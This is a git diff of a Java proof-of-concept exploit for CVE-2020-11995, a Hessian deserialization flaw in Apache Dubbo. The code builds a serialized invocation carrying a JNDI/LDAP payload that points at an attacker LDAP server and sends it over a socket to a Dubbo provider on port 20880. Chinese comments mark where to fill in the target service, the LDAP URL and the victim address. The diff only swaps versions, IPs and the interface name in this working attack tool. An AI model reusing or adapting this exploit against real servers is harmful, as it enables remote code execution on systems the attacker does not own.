@@ -7,7 +7,7 @@ import marshalsec.util.Reflections;
 import org.apache.dubbo.common.io.Bytes;
 import org.apache.dubbo.common.serialize.Cleanable;
 import org.apache.dubbo.serialize.hessian.Hessian2ObjectOutput;
-
+import org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation;
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Array;
@@ -17,12 +17,10 @@ import java.util.HashMap;
 import java.util.Random;
 
 /**
- * 影响版本：
- * 2.7.0 <= Dubbo <= 2.7.7
- * 2.6.0 <= Dubbo <= 2.6.8
- * Dubbo 2.5.x
+ * 测试版本：dubbo 2.7.6
  */
 public class CVE_2020_11995 {
+
 
     public static void setPayload(Hessian2ObjectOutput hessian2ObjectOutput,String jndiUrl) throws Exception {
 
@@ -52,6 +50,7 @@ public class CVE_2020_11995 {
 
         hessian2ObjectOutput.writeObject(s);
     }
+
     public static void main(String[] args) throws Exception{
 
 
@@ -73,13 +72,13 @@ public class CVE_2020_11995 {
 
         hessian2ObjectOutput.writeUTF("2.7.6");//dubbo版本
 //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
-        hessian2ObjectOutput.writeUTF("com.example.api.DemoService");//接口全限定名
+        hessian2ObjectOutput.writeUTF("com.pacemrc.dubbo.api.DemoService");//接口全限定名
         hessian2ObjectOutput.writeUTF("");//接口的版本
         hessian2ObjectOutput.writeUTF("$invokeAsync");//$invoke $invokeAsync $echo  方法名换成三个中任意一个
 //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
         hessian2ObjectOutput.writeUTF("Ljava/util/Map;");
 //todo 此处填写ldap url
-        setPayload(hessian2ObjectOutput,"ldap://10.41.230.66:1389/uqsh9k");
+        setPayload(hessian2ObjectOutput,"ldap://10.58.120.200:1389/pikl90");
         hessian2ObjectOutput.writeObject(new HashMap());
 
         hessian2ObjectOutput.flushBuffer();
@@ -94,7 +93,7 @@ public class CVE_2020_11995 {
         byte[] bytes = dubbo_data.toByteArray();
 
 //todo 此处填写被攻击的dubbo服务提供者地址和端口
-        Socket socket = new Socket("10.41.230.66", 20880);
+        Socket socket = new Socket("10.58.120.200", 20880);
         OutputStream outputStream = socket.getOutputStream();
         outputStream.write(bytes);
         outputStream.flush();
